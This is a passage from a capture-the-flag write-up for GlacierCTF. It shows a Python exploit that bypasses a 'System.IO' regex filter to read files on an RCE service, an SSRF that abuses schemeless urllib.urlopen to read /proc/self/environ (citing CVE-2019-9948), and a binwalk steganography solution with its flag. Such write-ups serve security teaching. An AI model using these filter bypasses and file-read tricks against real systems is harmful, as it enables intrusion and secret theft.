        This incident will be reported.'");
}
```

The regex looks for the exact match of `"System.IO"`. Since we know that the grammars on which common programming languages are built typically allow us to insert any mount of whitespaces between keywords, we can bypass this regex just by inserting a whitespace between a keyword (`System` or `IO`) and the dot which separates them.
```py
#!/usr/bin/env python3
import requests

base = 'https://rce-as-a-service-2.ctf.glacierctf.com'

def send_rce(data, code):
    endpoint = base + '/rce'
    payload = { 'Data': data, 'Query': code}
    res = requests.post(endpoint, json=payload)
    return res.text

print(send_rce(["/flag.txt"], 
    '(data) => data.Select((d) => System. IO.File.ReadLines(d))'))
```

## Glacier Top News
A Flask API with a Vue front-end is given us. The code is available [here](/downloadables/glacier_glacier_top_news.zip). Note that this challenge is running on Python 2. There are a few routes that are weirdly written, but that is probably due to Vue being used for the front-end.

Then, there is an endpoint that smells of SSRF really badly:
```py
@app.route('/api/get_resource', methods=['POST'])
def get_resource():
    url = request.json['url']

    if(Filter.isBadUrl(url)):
        return 'Illegal Url Scheme provided', 500

    content = urlopen(url)
    return content.read(), 200
```

This seems to use the Filter class, which is defined in `utils.py`:

```py
class Filter:
    BAD_URL_SCHEMES = ['file', 'ftp', 'local_file']
    BAD_HOSTNAMES = ["google", "twitter", "githubusercontent", "microsoft"]

    @staticmethod
    def isBadUrl(url):
        return Filter.bad_schema(url)

    @staticmethod
    def bad_schema(url):
        scheme = url.split(':')[0]
        return scheme.lower() in Filter.BAD_URL_SCHEMES

    @staticmethod
    def bad_urls(url):
        for hostname in Filter.BAD_HOSTNAMES:
            if hostname in url:
                return True

        return False
```

We can notice that a blacklist approach is used, both for schemes and URLs (but the latter filter is not used at all). As `urllib` only implements those three schemes, it doesn't look like there is an SSRF here.

By looking at the `urllib.urlopen` documentation, we can however discover an interesting fact:

> Open a network object denoted by a URL for reading. If the URL does not have a scheme identifier, or if it has file: as its scheme identifier, this opens a local file (without universal newlines); otherwise it opens a socket to a server somewhere on the network.

Therefore, we don't need a scheme! As the flag is not in a file, the intended solution would be to read the local SQLite3 database (in which the admin's JWT is ~~unreasonably~~ stored in), and use that to complete a further step. However, we can play it cool and just read `/proc/self/environ`, which is a symlink to `/proc/<pid>/environ` (where `<pid>` is the web server process pid), which contains the process environment variables, including the flag!

Moreover, the authors also pointed out that this was the same exact problem reported in [CVE-2019-9948](https://bugs.python.org/issue35907), therefore also using `local-file` was a viable solution.

# Misc

## The Climber

### Description
Last year i finally got to climb my first glacier. Look at how pretty my picture is.

### Solution
Using binwalk on the first image to extract the other images.
```sh
binwalk --dd='.*' glacier.jpg
```
The 2nd image has the flag written on it(bottom right).Adjust contrast and brightness to see flag

Flag: glacierctf{It'5_fUck1ng_C0ld_uP_h3r3}
